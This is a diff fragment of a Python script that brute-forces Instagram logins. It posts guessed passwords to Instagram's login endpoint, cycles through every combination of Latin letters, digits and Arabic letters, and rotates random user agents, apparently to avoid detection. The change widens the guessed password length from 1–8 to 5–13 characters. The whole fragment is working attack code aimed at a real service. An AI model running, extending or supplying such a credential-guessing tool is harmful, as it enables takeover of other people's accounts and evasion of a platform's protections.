@@ -13,7 +13,7 @@ loginurl='https://www.instagram.com/accounts/login/ajax/'
 
 chars = string.ascii_lowercase + string.digits + 'ضصثقفغعهخحجدطكمنتالبيسشئءؤرلىةوزذإآ'
 attempts = 0
-for password_length in range(1, 9):
+for password_length in range(5, 14):
     for guess in itertools.product(chars, repeat=password_length):
         useragents = random.choice(tools.headers_useragents)
         login = {
